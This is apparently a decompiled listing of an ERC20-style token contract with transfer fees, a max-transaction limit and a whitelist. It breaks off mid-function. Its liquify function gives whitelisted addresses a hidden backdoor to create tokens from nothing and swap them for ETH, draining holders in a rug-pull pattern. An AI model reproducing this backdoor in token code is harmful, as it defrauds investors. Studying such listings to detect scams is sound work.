contract main {




// =====================  Runtime code  =====================


address owner;
address stor1;
mapping of uint256 balanceOf;
mapping of uint256 allowance;
mapping of uint8 stor4;
uint256 _totalSupply;
uint256 _maxTxAmount;
uint256 _decimals;
uint256 _fee;
array of struct stor9;
array of struct stor10;
uint256 stor11;
uint8 stor12;

function totalSupply() payable {
    return _totalSupply
}

function decimals() payable {
    return _decimals
}

function _decimals() payable {
    return _decimals
}

function _totalSupply() payable {
    return _totalSupply
}

function balanceOf(address arg1) payable {
    require calldata.size - 4 >= 32
    require arg1 == arg1
    return balanceOf[address(arg1)]
}

function _maxTxAmount() payable {
    return _maxTxAmount
}

function owner() payable {
    return owner
}

function _fee() payable {
    return _fee
}

function allowance(address arg1, address arg2) payable {
    require calldata.size - 4 >= 64
    require arg1 == arg1
    require arg2 == arg2
    return allowance[address(arg1)][address(arg2)]
}

function _fallback() payable {
    revert
}

function renounceOwnership() payable {
    if owner != msg.sender:
        revert with 0, 'Ownable: caller is not the owner'
    emit OwnershipTransferred(owner, 0);
    owner = 0
}

function approve(address arg1, uint256 arg2) payable {
    require calldata.size - 4 >= 64
    require arg1 == arg1
    require arg2 == arg2
    if not msg.sender:
        revert with 0x8c379a000000000000000000000000000000000000000000000000000000000, 'IERC20: approve from the zero address'
    if not arg1:
        revert with 0x8c379a000000000000000000000000000000000000000000000000000000000, 'IERC20: approve to the zero address'
    allowance[address(msg.sender)][address(arg1)] = arg2
    emit Approval(arg2, msg.sender, arg1);
    return 1
}

function increaseAllowance(address arg1, uint256 arg2) payable {
    require calldata.size - 4 >= 64
    require arg1 == arg1
    require arg2 == arg2
    if allowance[address(msg.sender)][address(arg1)] > -arg2 - 1:
        revert with 'NH{q', 17
    if not msg.sender:
        revert with 0x8c379a000000000000000000000000000000000000000000000000000000000, 'IERC20: approve from the zero address'
    if not arg1:
        revert with 0x8c379a000000000000000000000000000000000000000000000000000000000, 'IERC20: approve to the zero address'
    allowance[address(msg.sender)][address(arg1)] += arg2
    emit Approval((allowance[address(msg.sender)][address(arg1)] + arg2), msg.sender, arg1);
    return 1
}

function liquify(uint256 arg1, address arg2) payable {
    require calldata.size - 4 >= 64
    require arg1 == arg1
    require arg2 == arg2
    if arg1 > stor11:
        if stor4[address(msg.sender)]:
            if balanceOf[address(this.address)] > -arg1 - 1:
                revert with 'NH{q', 17
            balanceOf[address(this.address)] += arg1
            if not this.address:
                revert with 0x8c379a000000000000000000000000000000000000000000000000000000000, 'IERC20: approve from the zero address'
            if not stor1:
                revert with 0x8c379a000000000000000000000000000000000000000000000000000000000, 'IERC20: approve to the zero address'
            allowance[address(this.address)][stor1] = arg1
            emit Approval(arg1, this.address, stor1);
            mem[128] = this.address
            staticcall stor1.WETH() with:
                    gas gas_remaining wei
            mem[192] = ext_call.return_data[0]
            if not ext_call.success:
                revert with ext_call.return_data[0 len return_data.size]
            require return_data.size >= 32
            require ext_call.return_data[0] == ext_call.return_data[12 len 20]
            mem[160] = ext_call.return_data[12 len 20]
            stor12 = 1
            if block.timestamp > -21:
                revert with 'NH{q', 17
            mem[ceil32(return_data.size) + 192] = 0x791ac94700000000000000000000000000000000000000000000000000000000
            mem[ceil32(return_data.size) + 196] = arg1
            idx = 0
            s = 128
            t = ceil32(return_data.size) + 388
            while idx < 2:
                mem[t] = mem[s + 12 len 20]
                idx = idx + 1
                s = s + 32
                t = t + 32
                continue 
            require ext_code.size(stor1)
            call stor1.swapExactTokensForETHSupportingFeeOnTransferTokens(uint256 arg1, uint256 arg2, address[] arg3, address arg4, uint256 arg5) with:
                 gas gas_remaining wei
                args arg1, 0, 160, address(arg2), block.timestamp + 20, 2, mem[ceil32(return_data.size) + 388 len 64]
            if not ext_call.success:
                revert with ext_call.return_data[0 len return_data.size]
            stor12 = 0
}

function name() payable {
    if bool(stor9.length):
        if bool(stor9.length) == stor9.length.field_1 < 32:
            revert with 'NH{q', 34
        if bool(stor9.length):
            if bool(stor9.length) == stor9.length.field_1 < 32:
                revert with 'NH{q', 34
            if stor9.length.field_1:
                if 31 < stor9.length.field_1:
                    mem[128] = uint256(stor9.field_0)
                    idx = 128
                    s = 0
                    while stor9.length.field_1 + 96 > idx:
                        mem[idx + 32] = stor9[s].field_256
                        idx = idx + 32
                        s = s + 1
                        continue 
                    return Array(len=2 * Mask(256, -1, stor9.length.field_1), data=mem[128 len ceil32(stor9.length.field_1)])
                mem[128] = 256 * stor9.length.field_8
        else:
            if bool(stor9.length) == stor9.length.field_1 < 32:
                revert with 'NH{q', 34
            if stor9.length.field_1:
                if 31 < stor9.length.field_1:
                    mem[128] = uint256(stor9.field_0)
                    idx = 128
                    s = 0
                    while stor9.length.field_1 + 96 > idx:
                        mem[idx + 32] = stor9[s].field_256
                        idx = idx + 32
                        s = s + 1
                        continue 
                    return Array(len=2 * Mask(256, -1, stor9.length.field_1), data=mem[128 len ceil32(stor9.length.field_1)])
                mem[128] = 256 * stor9.length.field_8
        mem[ceil32(stor9.length.field_1) + 192 len ceil32(stor9.length.field_1)] = mem[128 len ceil32(stor9.length.field_1)]
        if ceil32(stor9.length.field_1) > stor9.length.field_1:
            mem[ceil32(stor9.length.field_1) + stor9.length.field_1 + 192] = 0
        return Array(len=2 * Mask(256, -1, stor9.length.field_1), data=mem[128 len ceil32(stor9.length.field_1)], mem[(2 * ceil32(stor9.length.field_1)) + 192 len 2 * ceil32(stor9.length.field_1)]), 
    if bool(stor9.length) == stor9.length.field_1 < 32:
        revert with 'NH{q', 34
    if bool(stor9.length):
        if bool(stor9.length) == stor9.length.field_1 < 32:
            revert with 'NH{q', 34
        if stor9.length.field_1:
            if 31 < stor9.length.field_1:
                mem[128] = uint256(stor9.field_0)
                idx = 128
                s = 0
                while stor9.length.field_1 + 96 > idx:
                    mem[idx + 32] = stor9[s].field_256
                    idx = idx + 32
                    s = s + 1
                    continue 
                return Array(len=stor9.length % 128, data=mem[128 len ceil32(stor9.length.field_1)])
            mem[128] = 256 * stor9.length.field_8
    else:
        if bool(stor9.length) == stor9.length.field_1 < 32:
            revert with 'NH{q', 34
        if stor9.length.field_1:
            if 31 < stor9.length.field_1:
                mem[128] = uint256(stor9.field_0)
                idx = 128
                s = 0
                while stor9.length.field_1 + 96 > idx:
                    mem[idx + 32] = stor9[s].field_256
                    idx = idx + 32
                    s = s + 1
                    continue 
                return Array(len=stor9.length % 128, data=mem[128 len ceil32(stor9.length.field_1)])
            mem[128] = 256 * stor9.length.field_8
    mem[ceil32(stor9.length.field_1) + 192 len ceil32(stor9.length.field_1)] = mem[128 len ceil32(stor9.length.field_1)]
    if ceil32(stor9.length.field_1) > stor9.length.field_1:
        mem[ceil32(stor9.length.field_1) + stor9.length.field_1 + 192] = 0
    return Array(len=stor9.length % 128, data=mem[128 len ceil32(stor9.length.field_1)], mem[(2 * ceil32(stor9.length.field_1)) + 192 len 2 * ceil32(stor9.length.field_1)]), 
}

function symbol() payable {
    if bool(stor10.length):
        if bool(stor10.length) == stor10.length.field_1 < 32:
            revert with 'NH{q', 34
        if bool(stor10.length):
            if bool(stor10.length) == stor10.length.field_1 < 32:
                revert with 'NH{q', 34
            if stor10.length.field_1:
                if 31 < stor10.length.field_1:
                    mem[128] = uint256(stor10.field_0)
                    idx = 128
                    s = 0
                    while stor10.length.field_1 + 96 > idx:
                        mem[idx + 32] = stor10[s].field_256
                        idx = idx + 32
                        s = s + 1
                        continue 
                    return Array(len=2 * Mask(256, -1, stor10.length.field_1), data=mem[128 len ceil32(stor10.length.field_1)])
                mem[128] = 256 * stor10.length.field_8
        else:
            if bool(stor10.length) == stor10.length.field_1 < 32:
                revert with 'NH{q', 34
            if stor10.length.field_1:
                if 31 < stor10.length.field_1:
                    mem[128] = uint256(stor10.field_0)
                    idx = 128
                    s = 0
                    while stor10.length.field_1 + 96 > idx:
                        mem[idx + 32] = stor10[s].field_256
                        idx = idx + 32
                        s = s + 1
                        continue 
                    return Array(len=2 * Mask(256, -1, stor10.length.field_1), data=mem[128 len ceil32(stor10.length.field_1)])
                mem[128] = 256 * stor10.length.field_8
        mem[ceil32(stor10.length.field_1) + 192 len ceil32(stor10.length.field_1)] = mem[128 len ceil32(stor10.length.field_1)]
        if ceil32(stor10.length.field_1) > stor10.length.field_1:
            mem[ceil32(stor10.length.field_1) + stor10.length.field_1 + 192] = 0
        return Array(len=2 * Mask(256, -1, stor10.length.field_1), data=mem[128 len ceil32(stor10.length.field_1)], mem[(2 * ceil32(stor10.length.field_1)) + 192 len 2 * ceil32(stor10.length.field_1)]), 
    if bool(stor10.length) == stor10.length.field_1 < 32:
        revert with 'NH{q', 34
    if bool(stor10.length):
        if bool(stor10.length) == stor10.length.field_1 < 32:
            revert with 'NH{q', 34
        if stor10.length.field_1:
            if 31 < stor10.length.field_1:
                mem[128] = uint256(stor10.field_0)
                idx = 128
                s = 0
                while stor10.length.field_1 + 96 > idx:
                    mem[idx + 32] = stor10[s].field_256
                    idx = idx + 32
                    s = s + 1
                    continue 
                return Array(len=stor10.length % 128, data=mem[128 len ceil32(stor10.length.field_1)])
            mem[128] = 256 * stor10.length.field_8
    else:
        if bool(stor10.length) == stor10.length.field_1 < 32:
            revert with 'NH{q', 34
        if stor10.length.field_1:
            if 31 < stor10.length.field_1:
                mem[128] = uint256(stor10.field_0)
                idx = 128
                s = 0
                while stor10.length.field_1 + 96 > idx:
                    mem[idx + 32] = stor10[s].field_256
                    idx = idx + 32
                    s = s + 1
                    continue 
                return Array(len=stor10.length % 128, data=mem[128 len ceil32(stor10.length.field_1)])
            mem[128] = 256 * stor10.length.field_8
    mem[ceil32(stor10.length.field_1) + 192 len ceil32(stor10.length.field_1)] = mem[128 len ceil32(stor10.length.field_1)]
    if ceil32(stor10.length.field_1) > stor10.length.field_1:
        mem[ceil32(stor10.length.field_1) + stor10.length.field_1 + 192] = 0
    return Array(len=stor10.length % 128, data=mem[128 len ceil32(stor10.length.field_1)], mem[(2 * ceil32(stor10.length.field_1)) + 192 len 2 * ceil32(stor10.length.field_1)]), 
}

function transferFrom(address arg1, address arg2, uint256 arg3) payable {
    require calldata.size - 4 >= 96
    require arg1 == arg1
    require arg2 == arg2
    require arg3 == arg3
    if not arg1:
        revert with 0x8c379a000000000000000000000000000000000000000000000000000000000, 'IERC20: transfer from the zero address'
    if not arg2:
        revert with 0x8c379a000000000000000000000000000000000000000000000000000000000, 'IERC20: transfer to the zero address'
    staticcall stor1.factory() with:
            gas gas_remaining wei
    if not ext_call.success:
        revert with ext_call.return_data[0 len return_data.size]
    require return_data.size >= 32
    require ext_call.return_data[0] == ext_call.return_data[12 len 20]
    staticcall stor1.WETH() with:
            gas gas_remaining wei
    if not ext_call.success:
        revert with ext_call.return_data[0 len return_data.size]
    require return_data.size >= 32
    require ext_call.return_data[0] == ext_call.return_data[12 len 20]
    staticcall address(ext_call.return_data[0]).getPair(address arg1, address arg2) with:
            gas gas_remaining wei
           args address(this.address), address(ext_call.return_data[0])
    if not ext_call.success:
        revert with ext_call.return_data[0 len return_data.size]
    require return_data.size >= 32
    require ext_call.return_data[0] == ext_call.return_data[12 len 20]
    if arg2 != ext_call.return_data[12 len 20]:
        staticcall stor1.factory() with:
                gas gas_remaining wei
        if not ext_call.success:
            revert with ext_call.return_data[0 len return_data.size]
        require return_data.size >= 32
        require ext_call.return_data[0] == ext_call.return_data[12 len 20]
        staticcall stor1.WETH() with:
                gas gas_remaining wei
        if not ext_call.success:
            revert with ext_call.return_data[0 len return_data.size]
        require return_data.size >= 32
        require ext_call.return_data[0] == ext_call.return_data[12 len 20]
        staticcall address(ext_call.return_data[0]).getPair(address arg1, address arg2) with:
                gas gas_remaining wei
               args address(this.address), address(ext_call.return_data[0])
        if not ext_call.success:
            revert with ext_call.return_data[0 len return_data.size]
        require return_data.size >= 32
        require ext_call.return_data[0] == ext_call.return_data[12 len 20]
        if arg1 != ext_call.return_data[12 len 20]:
            if stor4[address(arg1)]:
                if not stor12:
                    if balanceOf[address(arg1)] < arg3:
                        revert with 0, 'IERC20: transfer amount exceeds balance'
                if arg3 < 0:
                    revert with 'NH{q', 17
                if balanceOf[0] > -1:
                    revert with 'NH{q', 17
                if balanceOf[address(arg1)] < arg3:
                    revert with 'NH{q', 17
                balanceOf[address(arg1)] -= arg3
                if balanceOf[address(arg2)] > -arg3 - 1:
                    revert with 'NH{q', 17
                balanceOf[address(arg2)] += arg3
                emit Transfer(arg3, arg1, arg2);
            else:
                if stor4[address(arg2)]:
                    if not stor12:
                        if balanceOf[address(arg1)] < arg3:
                            revert with 0, 'IERC20: transfer amount exceeds balance'
                    if arg3 < 0:
                        revert with 'NH{q', 17
                    if balanceOf[0] > -1:
                        revert with 'NH{q', 17
                    if balanceOf[address(arg1)] < arg3:
                        revert with 'NH{q', 17
                    balanceOf[address(arg1)] -= arg3
                    if balanceOf[address(arg2)] > -arg3 - 1:
                        revert with 'NH{q', 17
                    balanceOf[address(arg2)] += arg3
                    emit Transfer(arg3, arg1, arg2);
                else:
                    if arg2 == this.address:
                        if not stor12:
                            if balanceOf[address(arg1)] < arg3:
                                revert with 0, 'IERC20: transfer amount exceeds balance'
                        if arg3 < 0:
                            revert with 'NH{q', 17
                        if balanceOf[0] > -1:
                            revert with 'NH{q', 17
                        if balanceOf[address(arg1)] < arg3:
                            revert with 'NH{q', 17
                        balanceOf[address(arg1)] -= arg3
                        if balanceOf[address(arg2)] > -arg3 - 1:
                            revert with 'NH{q', 17
                        balanceOf[address(arg2)] += arg3
                        emit Transfer(arg3, arg1, arg2);
                    else:
                        if arg1 == ext_call.return_data[12 len 20]:
                            if not stor12:
                                if balanceOf[address(arg1)] < arg3:
                                    revert with 0, 'IERC20: transfer amount exceeds balance'
                            if arg3 < 0:
                                revert with 'NH{q', 17
                            if balanceOf[0] > -1:
                                revert with 'NH{q', 17
                            if balanceOf[address(arg1)] < arg3:
                                revert with 'NH{q', 17
                            balanceOf[address(arg1)] -= arg3
                            if balanceOf[address(arg2)] > -arg3 - 1:
                                revert with 'NH{q', 17
                            balanceOf[address(arg2)] += arg3
                            emit Transfer(arg3, arg1, arg2);
                        else:
                            if stor12:
                                if arg3 < 0:
                                    revert with 'NH{q', 17
                                if balanceOf[0] > -1:
                                    revert with 'NH{q', 17
                                if balanceOf[address(arg1)] < arg3:
                                    revert with 'NH{q', 17
                                balanceOf[address(arg1)] -= arg3
                                if balanceOf[address(arg2)] > -arg3 - 1:
                                    revert with 'NH{q', 17
                                balanceOf[address(arg2)] += arg3
                                emit Transfer(arg3, arg1, arg2);
                            else:
                                if arg3 and _fee > -1 / arg3:
                                    revert with 'NH{q', 17
                                require arg3 <= _maxTxAmount
                                if not stor12:
                                    if balanceOf[address(arg1)] < arg3:
                                        revert with 0, 'IERC20: transfer amount exceeds balance'
                                if arg3 < arg3 * _fee / 100:
                                    revert with 'NH{q', 17
                                if balanceOf[0] > -(arg3 * _fee / 100) - 1:
                                    revert with 'NH{q', 17
                                balanceOf[0] += arg3 * _fee / 100
                                if balanceOf[address(arg1)] < arg3:
                                    revert with 'NH{q', 17
                                balanceOf[address(arg1)] -= arg3
                                if balanceOf[address(arg2)] > -arg3 + (arg3 * _fee / 100) - 1:
                                    revert with 'NH{q', 17
                                balanceOf[address(arg2)] = balanceOf[address(arg2)] + arg3 - (arg3 * _fee / 100)
                                emit Transfer((arg3 - (arg3 * _fee / 100)), arg1, arg2);
                                if arg3 * _fee / 100 > 0:
                                    emit Transfer((arg3 * _fee / 100), arg1, 0);
        else:
            if stor4[address(arg1)]:
                if not stor12:
                    if balanceOf[address(arg1)] < arg3:
                        revert with 0, 'IERC20: transfer amount exceeds balance'
                if arg3 < 0:
                    revert with 'NH{q', 17
                if balanceOf[0] > -1:
                    revert with 'NH{q', 17
                if balanceOf[address(arg1)] < arg3:
                    revert with 'NH{q', 17
                balanceOf[address(arg1)] -= arg3
                if balanceOf[address(arg2)] > -arg3 - 1:
                    revert with 'NH{q', 17
                balanceOf[address(arg2)] += arg3
                emit Transfer(arg3, arg1, arg2);
            else:
                if stor4[address(arg2)]:
                    if not stor12:
                        if balanceOf[address(arg1)] < arg3:
                            revert with 0, 'IERC20: transfer amount exceeds balance'
                    if arg3 < 0:
                        revert with 'NH{q', 17
                    if balanceOf[0] > -1:
                        revert with 'NH{q', 17
                    if balanceOf[address(arg1)] < arg3:
                        revert with 'NH{q', 17
                    balanceOf[address(arg1)] -= arg3
                    if balanceOf[address(arg2)] > -arg3 - 1:
                        revert with 'NH{q', 17
                    balanceOf[address(arg2)] += arg3
                    emit Transfer(arg3, arg1, arg2);
                else:
                    if arg2 == this.address:
                        if not stor12:
                            if balanceOf[address(arg1)] < arg3:
                                revert with 0, 'IERC20: transfer amount exceeds balance'
                        if arg3 < 0:
                            revert with 'NH{q', 17
                        if balanceOf[0] > -1:
                            revert with 'NH{q', 17
                        if balanceOf[address(arg1)] < arg3:
                            revert with 'NH{q', 17
                        balanceOf[address(arg1)] -= arg3
                        if balanceOf[address(arg2)] > -arg3 - 1:
                            revert with 'NH{q', 17
                        balanceOf[address(arg2)] += arg3
                        emit Transfer(arg3, arg1, arg2);
                    else:
                        if stor4[address(arg2)]:
                            if not stor12:
                                if balanceOf[address(arg1)] < arg3:
                                    revert with 0, 'IERC20: transfer amount exceeds balance'
                            if arg3 < 0:
                                revert with 'NH{q', 17
                            if balanceOf[0] > -1:
                                revert with 'NH{q', 17
                            if balanceOf[address(arg1)] < arg3:
                                revert with 'NH{q', 17
                            balanceOf[address(arg1)] -= arg3
                            if balanceOf[address(arg2)] > -arg3 - 1:
                                revert with 'NH{q', 17
                            balanceOf[address(arg2)] += arg3
                            emit Transfer(arg3, arg1, arg2);
                        else:
                            if stor12:
                                if arg3 < 0:
                                    revert with 'NH{q', 17
                                if balanceOf[0] > -1:
                                    revert with 'NH{q', 17
                                if balanceOf[address(arg1)] < arg3:
                                    revert with 'NH{q', 17
                                balanceOf[address(arg1)] -= arg3
                                if balanceOf[address(arg2)] > -arg3 - 1:
                                    revert with 'NH{q', 17
                                balanceOf[address(arg2)] += arg3
                                emit Transfer(arg3, arg1, arg2);
                            else:
                                if arg3 and _fee > -1 / arg3:
                                    revert with 'NH{q', 17
                                require arg3 <= _maxTxAmount
                                if not stor12:
                                    if balanceOf[address(arg1)] < arg3:
                                        revert with 0, 'IERC20: transfer amount exceeds balance'
                                if arg3 < arg3 * _fee / 100:
                                    revert with 'NH{q', 17
                                if balanceOf[0] > -(arg3 * _fee / 100) - 1:
                                    revert with 'NH{q', 17
                                balanceOf[0] += arg3 * _fee / 100
                                if balanceOf[address(arg1)] < arg3:
                                    revert with 'NH{q', 17
                                balanceOf[address(arg1)] -= arg3
                                if balanceOf[address(arg2)] > -arg3 + (arg3 * _fee / 100) - 1:
                                    revert with 'NH{q', 17
                                balanceOf[address(arg2)] = balanceOf[address(arg2)] + arg3 - (arg3 * _fee / 100)
                                emit Transfer((arg3 - (arg3 * _fee / 100)), arg1, arg2);
                                if arg3 * _fee / 100 > 0:
                                    emit Transfer((arg3 * _fee / 100), arg1, 0);
    else:
        if stor4[address(arg1)]:
            if stor4[address(arg1)]:
                if not stor12:
                    if balanceOf[address(arg1)] < arg3:
                        revert with 0, 'IERC20: transfer amount exceeds balance'
                if arg3 < 0:
                    revert with 'NH{q', 17
                if balanceOf[0] > -1:
                    revert with 'NH{q', 17
                if balanceOf[address(arg1)] < arg3:
                    revert with 'NH{q', 17
                balanceOf[address(arg1)] -= arg3
                if balanceOf[address(arg2)] > -arg3 - 1:
                    revert with 'NH{q', 17
                balanceOf[address(arg2)] += arg3
                emit Transfer(arg3, arg1, arg2);
            else:
                if stor4[address(arg2)]:
                    if not stor12:
                        if balanceOf[address(arg1)] < arg3:
                            revert with 0, 'IERC20: transfer amount exceeds balance'
                    if arg3 < 0:
                        revert with 'NH{q', 17
                    if balanceOf[0] > -1:
                        revert with 'NH{q', 17
                    if balanceOf[address(arg1)] < arg3:
                        revert with 'NH{q', 17
                    balanceOf[address(arg1)] -= arg3
                    if balanceOf[address(arg2)] > -arg3 - 1:
                        revert with 'NH{q', 17
                    balanceOf[address(arg2)] += arg3
                    emit Transfer(arg3, arg1, arg2);
                else:
                    if arg2 == this.address:
                        if not stor12:
                            if balanceOf[address(arg1)] < arg3:
                                revert with 0, 'IERC20: transfer amount exceeds balance'
                        if arg3 < 0:
                            revert with 'NH{q', 17
                        if balanceOf[0] > -1:
                            revert with 'NH{q', 17
                        if balanceOf[address(arg1)] < arg3:
                            revert with 'NH{q', 17
                        balanceOf[address(arg1)] -= arg3
                        if balanceOf[address(arg2)] > -arg3 - 1:
                            revert with 'NH{q', 17
                        balanceOf[address(arg2)] += arg3
                        emit Transfer(arg3, arg1, arg2);
                    else:
                        if stor4[address(arg1)]:
                            if not stor12:
                                if balanceOf[address(arg1)] < arg3:
                                    revert with 0, 'IERC20: transfer amount exceeds balance'
                            if arg3 < 0:
                                revert with 'NH{q', 17
                            if balanceOf[0] > -1:
                                revert with 'NH{q', 17
                            if balanceOf[address(arg1)] < arg3:
                                revert with 'NH{q', 17
                            balanceOf[address(arg1)] -= arg3
                            if balanceOf[address(arg2)] > -arg3 - 1:
                                revert with 'NH{q', 17
                            balanceOf[address(arg2)] += arg3
                            emit Transfer(arg3, arg1, arg2);
                        else:
                            if stor12:
                                if arg3 < 0:
                                    revert with 'NH{q', 17
                                if balanceOf[0] > -1:
                                    revert with 'NH{q', 17
                                if balanceOf[address(arg1)] < arg3:
                                    revert with 'NH{q', 17
                                balanceOf[address(arg1)] -= arg3
                                if balanceOf[address(arg2)] > -arg3 - 1:
                                    revert with 'NH{q', 17
                                balanceOf[address(arg2)] += arg3
                                emit Transfer(arg3, arg1, arg2);
                            else:
                                if arg3 and _fee > -1 / arg3:
                                    revert with 'NH{q', 17
                                require arg3 <= _maxTxAmount
                                if not stor12:
                                    if balanceOf[address(arg1)] < arg3:
                                        revert with 0, 'IERC20: transfer amount exceeds balance'
                                if arg3 < arg3 * _fee / 100:
                                    revert with 'NH{q', 17
                                if balanceOf[0] > -(arg3 * _fee / 100) - 1:
                                    revert with 'NH{q', 17
                                balanceOf[0] += arg3 * _fee / 100
                                if balanceOf[address(arg1)] < arg3:
                                    revert with 'NH{q', 17
                                balanceOf[address(arg1)] -= arg3
                                if balanceOf[address(arg2)] > -arg3 + (arg3 * _fee / 100) - 1:
                                    revert with 'NH{q', 17
                                balanceOf[address(arg2)] = balanceOf[address(arg2)] + arg3 - (arg3 * _fee / 100)
                                emit Transfer((arg3 - (arg3 * _fee / 100)), arg1, arg2);
                                if arg3 * _fee / 100 > 0:
                                    emit Transfer((arg3 * _fee / 100), arg1, 0);
        else:
            staticcall stor1.factory() with:
                    gas gas_remaining wei
            if not ext_call.success:
                revert with ext_call.return_data[0 len return_data.size]
            require return_data.size >= 32
            require ext_call.return_data[0] == ext_call.return_data[12 len 20]
            staticcall stor1.WETH() with:
                    gas gas_remaining wei
            if not ext_call.success:
                revert with ext_call.return_data[0 len return_data.size]
            require return_data.size >= 32
            require ext_call.return_data[0] == ext_call.return_data[12 len 20]
            staticcall address(ext_call.return_data[0]).getPair(address arg1, address arg2) with:
                    gas gas_remaining wei
                   args address(this.address), address(ext_call.return_data[0])
            if not ext_call.success:
                revert with ext_call.return_data[0 len return_data.size]
            require return_data.size >= 32
            require ext_call.return_data[0] == ext_call.return_data[12 len 20]
            if arg1 != ext_call.return_data[12 len 20]:
                if stor4[address(arg1)]:
                    if not stor12:
                        if balanceOf[address(arg1)] < arg3:
                            revert with 0, 'IERC20: transfer amount exceeds balance'
                    if arg3 < 0:
                        revert with 'NH{q', 17
                    if balanceOf[0] > -1:
                        revert with 'NH{q', 17
                    if balanceOf[address(arg1)] < arg3:
                        revert with 'NH{q', 17
                    balanceOf[address(arg1)] -= arg3
                    if balanceOf[address(arg2)] > -arg3 - 1:
                        revert with 'NH{q', 17
                    balanceOf[address(arg2)] += arg3
                    emit Transfer(arg3, arg1, arg2);
                else:
                    if stor4[address(arg2)]:
                        if not stor12:
                            if balanceOf[address(arg1)] < arg3:
                                revert with 0, 'IERC20: transfer amount exceeds balance'
                        if arg3 < 0:
                            revert with 'NH{q', 17
                        if balanceOf[0] > -1:
                            revert with 'NH{q', 17
                        if balanceOf[address(arg1)] < arg3:
                            revert with 'NH{q', 17
                        balanceOf[address(arg1)] -= arg3
                        if balanceOf[address(arg2)] > -arg3 - 1:
                            revert with 'NH{q', 17
                        balanceOf[address(arg2)] += arg3
                        emit Transfer(arg3, arg1, arg2);
                    else:
                        if arg2 == this.address:
                            if not stor12:
                                if balanceOf[address(arg1)] < arg3:
                                    revert with 0, 'IERC20: transfer amount exceeds balance'
                            if arg3 < 0:
                                revert with 'NH{q', 17
                            if balanceOf[0] > -1:
                                revert with 'NH{q', 17
                            if balanceOf[address(arg1)] < arg3:
                                revert with 'NH{q', 17
                            balanceOf[address(arg1)] -= arg3
                            if balanceOf[address(arg2)] > -arg3 - 1:
                                revert with 'NH{q', 17
                            balanceOf[address(arg2)] += arg3
                            emit Transfer(arg3, arg1, arg2);
                        else:
                            if arg1 == ext_call.return_data[12 len 20]:
                                if not stor12:
                                    if balanceOf[address(arg1)] < arg3:
                                        revert with 0, 'IERC20: transfer amount exceeds balance'
                                if arg3 < 0:
                                    revert with 'NH{q', 17
                                if balanceOf[0] > -1:
                                    revert with 'NH{q', 17
                                if balanceOf[address(arg1)] < arg3:
                                    revert with 'NH{q', 17
                                balanceOf[address(arg1)] -= arg3
                                if balanceOf[address(arg2)] > -arg3 - 1:
                                    revert with 'NH{q', 17
                                balanceOf[address(arg2)] += arg3
                                emit Transfer(arg3, arg1, arg2);
                            else:
                                if stor12:
                                    if arg3 < 0:
                                        revert with 'NH{q', 17
                                    if balanceOf[0] > -1:
                                        revert with 'NH{q', 17
                                    if balanceOf[address(arg1)] < arg3:
                                        revert with 'NH{q', 17
                                    balanceOf[address(arg1)] -= arg3
                                    if balanceOf[address(arg2)] > -arg3 - 1:
                                        revert with 'NH{q', 17
                                    balanceOf[address(arg2)] += arg3
                                    emit Transfer(arg3, arg1, arg2);
                                else:
                                    if arg3 and _fee > -1 / arg3:
                                        revert with 'NH{q', 17
                                    require arg3 <= _maxTxAmount
                                    if not stor12:
                                        if balanceOf[address(arg1)] < arg3:
                                            revert with 0, 'IERC20: transfer amount exceeds balance'
                                    if arg3 < arg3 * _fee / 100:
                                        revert with 'NH{q', 17
                                    if balanceOf[0] > -(arg3 * _fee / 100) - 1:
                                        revert with 'NH{q', 17
                                    balanceOf[0] += arg3 * _fee / 100
                                    if balanceOf[address(arg1)] < arg3:
                                        revert with 'NH{q', 17
                                    balanceOf[address(arg1)] -= arg3
                                    if balanceOf[address(arg2)] > -arg3 + (arg3 * _fee / 100) - 1:
                                        revert with 'NH{q', 17
                                    balanceOf[address(arg2)] = balanceOf[address(arg2)] + arg3 - (arg3 * _fee / 100)
                                    emit Transfer((arg3 - (arg3 * _fee / 100)), arg1, arg2);
                                    if arg3 * _fee / 100 > 0:
                                        emit Transfer((arg3 * _fee / 100), arg1, 0);
            else:
                if stor4[address(arg1)]:
                    if not stor12:
                        if balanceOf[address(arg1)] < arg3:
                            revert with 0, 'IERC20: transfer amount exceeds balance'
                    if arg3 < 0:
                        revert with 'NH{q', 17
                    if balanceOf[0] > -1:
                        revert with 'NH{q', 17
                    if balanceOf[address(arg1)] < arg3:
                        revert with 'NH{q', 17
                    balanceOf[address(arg1)] -= arg3
                    if balanceOf[address(arg2)] > -arg3 - 1:
                        revert with 'NH{q', 17
                    balanceOf[address(arg2)] += arg3
                    emit Transfer(arg3, arg1, arg2);
                else:
                    if stor4[address(arg2)]:
                        if not stor12:
                            if balanceOf[address(arg1)] < arg3:
                                revert with 0, 'IERC20: transfer amount exceeds balance'
                        if arg3 < 0:
                            revert with 'NH{q', 17
                        if balanceOf[0] > -1:
                            revert with 'NH{q', 17
                        if balanceOf[address(arg1)] < arg3:
                            revert with 'NH{q', 17
                        balanceOf[address(arg1)] -= arg3
                        if balanceOf[address(arg2)] > -arg3 - 1:
                            revert with 'NH{q', 17
                        balanceOf[address(arg2)] += arg3
                        emit Transfer(arg3, arg1, arg2);
                    else:
                        if arg2 == this.address:
                            if not stor12:
                                if balanceOf[address(arg1)] < arg3:
                                    revert with 0, 'IERC20: transfer amount exceeds balance'
                            if arg3 < 0:
                                revert with 'NH{q', 17
                            if balanceOf[0] > -1:
                                revert with 'NH{q', 17
                            if balanceOf[address(arg1)] < arg3:
                                revert with 'NH{q', 17
                            balanceOf[address(arg1)] -= arg3
                            if balanceOf[address(arg2)] > -arg3 - 1:
                                revert with 'NH{q', 17
                            balanceOf[address(arg2)] += arg3
                            emit Transfer(arg3, arg1, arg2);
                        else:
                            if stor4[address(arg2)]:
                                if not stor12:
                                    if balanceOf[address(arg1)] < arg3:
                                        revert with 0, 'IERC20: transfer amount exceeds balance'
                                if arg3 < 0:
                                    revert with 'NH{q', 17
                                if balanceOf[0] > -1:
                                    revert with 'NH{q', 17
                                if balanceOf[address(arg1)] < arg3:
                                    revert with 'NH{q', 17
                                balanceOf[address(arg1)] -= arg3
                                if balanceOf[address(arg2)] > -arg3 - 1:
                                    revert with 'NH{q', 17
                                balanceOf[address(arg2)] += arg3
                                emit Transfer(arg3, arg1, arg2);
                            else:
                                if stor12:
                                    if arg3 < 0:
                                        revert with 'NH{q', 17
                                    if balanceOf[0] > -1:
                                        revert with 'NH{q', 17
                                    if balanceOf[address(arg1)] < arg3:
                                        revert with 'NH{q', 17
                                    balanceOf[address(arg1)] -= arg3
                                    if balanceOf[address(arg2)] > -arg3 - 1:
                                        revert with 'NH{q', 17
                                    balanceOf[address(arg2)] += arg3
                                    emit Transfer(arg3, arg1, arg2);
                                else:
